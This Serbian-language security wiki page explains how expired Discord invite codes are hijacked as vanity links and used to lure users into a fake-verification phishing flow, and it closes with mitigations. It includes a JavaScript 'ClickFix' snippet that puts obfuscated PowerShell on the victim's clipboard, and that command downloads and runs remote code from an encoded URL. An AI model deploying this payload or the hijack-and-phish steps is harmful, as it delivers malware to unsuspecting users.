# Otmica Discord pozivnica

{{#include ../../banners/hacktricks-training.md}}

Vulnerability u Discord sistemu pozivnica omogućava akterima pretnji da preuzmu istekle ili obrisane invite kodove (privremene, trajne ili prilagođene vanity) kao nove vanity linkove na bilo kom serveru sa Level 3 Boost-om. Normalizacijom svih kodova u mala slova, napadači mogu unapred registrovati poznate invite kodove i neprimetno preusmeriti saobraćaj kada originalni link istekne ili izvorni server izgubi svoj boost.<sup>[[1]](#references)[[2]](#references)</sup>

## Tipovi pozivnica i rizik od otmice

| Tip pozivnice           | Može li biti oteta? | Uslov / komentari                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Privremeni invite link | ✅          | Nakon isteka, kod postaje dostupan i boosted server može ponovo da ga registruje kao vanity URL. |
| Trajni invite link | ⚠️          | Ako je obrisan i sastoji se samo od malih slova i cifara, kod može ponovo postati dostupan.        |
| Prilagođeni vanity link    | ✅          | Ako originalni server izgubi svoj Level 3 Boost, njegov vanity invite postaje dostupan za novu registraciju.    |

## Koraci eksploatacije

1. Izviđanje
- Pratite javne izvore (forume, društvene mreže, Telegram kanale) u potrazi za invite linkovima koji odgovaraju obrascu `discord.gg/{code}` ili `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Prikupite invite kodove od interesa (privremene ili vanity).
2. Pre-registracija
- Kreirajte ili upotrebite postojeći Discord server sa privilegijama Level 3 Boost-a.
- U **Server Settings → Vanity URL**, pokušajte da dodelite ciljani invite kod. Ako je prihvaćen, kod je rezervisan na serveru napadača.
3. Aktiviranje otmice
- Kod privremenih invite-ova, sačekajte da originalni invite istekne (ili ga ručno obrišite ako kontrolišete izvor).
- Kod kodova koji sadrže velika slova, varijanta sa malim slovima može odmah da se preuzme, iako se preusmeravanje aktivira tek nakon isteka.
4. Neprimetno preusmeravanje
- Korisnici koji posećuju stari link neprimetno se šalju na server pod kontrolom napadača kada otmica postane aktivna.

## Phishing tok preko Discord servera

1. Ograničite kanale servera tako da bude vidljiv samo kanal **#verify**.<sup>[[1]](#references)</sup>
2. Postavite bot (npr. **Safeguard#0786**) koji će nove korisnike podstaći da se verifikuju putem OAuth2.
3. Bot preusmerava korisnike na phishing sajt (npr. `captchaguard.me`) pod izgovorom CAPTCHA ili koraka za verifikaciju.
4. Implementirajte **ClickFix** UX trik:
- Prikažite poruku o neispravnom CAPTCHA izazovu.
- Uputite korisnike da otvore dijalog **Win+R**, nalepе unapred pripremljenu PowerShell komandu i pritisnu Enter.

### Primer ClickFix Clipboard Injection-a
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Ovaj pristup izbegava direktna preuzimanja datoteka i koristi poznate UI elemente kako bi smanjio sumnju korisnika.<sup>[[1]](#references)</sup>

## Mere zaštite

- Koristite stalne invite linkove koji sadrže najmanje jedno veliko slovo ili znak koji nije alfanumerički (ne ističu i ne mogu se ponovo koristiti).<sup>[[1]](#references)</sup>
- Redovno menjajte invite kodove i opozivajte stare linkove.
- Pratite status boostovanja Discord servera i preuzimanje vanity URL-ova.
- Obučite korisnike da provere autentičnost servera i izbegavaju izvršavanje komandi nalepljenih iz clipboarda.

## Reference

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
